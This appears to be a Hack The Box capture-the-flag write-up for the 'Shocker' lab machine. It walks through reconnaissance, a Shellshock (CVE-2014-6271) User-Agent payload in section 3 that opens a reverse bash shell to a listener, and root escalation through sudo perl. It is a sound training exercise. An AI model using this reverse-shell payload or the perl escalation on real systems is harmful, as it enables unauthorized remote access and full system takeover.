# HTB — Shocker

## Summary

| | |
|---|---|
| **Machine** | Shocker |
| **OS** | Linux (Ubuntu 16.04) |
| **Difficulty** | Easy |
| **Release** | 2017 |
| **Vectors** | Shellshock (CVE-2014-6271), sudo perl |

---

## 1. Reconnaissance

### Nmap

```bash
nmap -sV -sC -p- 10.129.59.4
```

Open ports:
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


---

## 2. Enumeration

### Gobuster

```bash
gobuster dir -u http://10.129.59.4/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt
```

Results:
```
/cgi-bin/     (Status: 403)
/index.html   (Status: 200)
/server-status (Status: 403)
```

### Fuzzing /cgi-bin/

```bash
ffuf -u http://10.129.59.4/cgi-bin/FUZZ -w raft-medium-words.txt -e .cgi,.sh,.pl -mc 200,204,301,302,307,401,403 -fc 404 -t 50 -c
```

Found:
```
user.sh    [Status: 200, Size: 119]
```

---

## 3. Foothold -- Shellshock (CVE-2014-6271)

```bash
nc -lvnp 4444
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.48/4444 0>&1'" http://10.129.59.4/cgi-bin/user.sh
```

Shell as `shelly`.

---

## 4. User 

```bash
cat /home/shelly/user.txt
```

---

## 5. Privilege Escalation

```bash
sudo -l
```

Output:
```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

GTFOBins - perl:

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
id
```

```
uid=0(root) gid=0(root)
```

---

## 6. Root 

```bash
cat /root/root.txt
```



---

## 7. Lessons Learned

1. Shellshock (CVE-2014-6271) -- classic. Payload: `() { :; }; <command>`.
2. /cgi-bin/ enumeration -- always fuzz with .cgi, .sh, .pl.
3. `sudo -l` -- first command after foothold.
4. GTFOBins -- bookmark it.
5. pwncat on Python 3.13 -- broken. Use nc + curl.

---

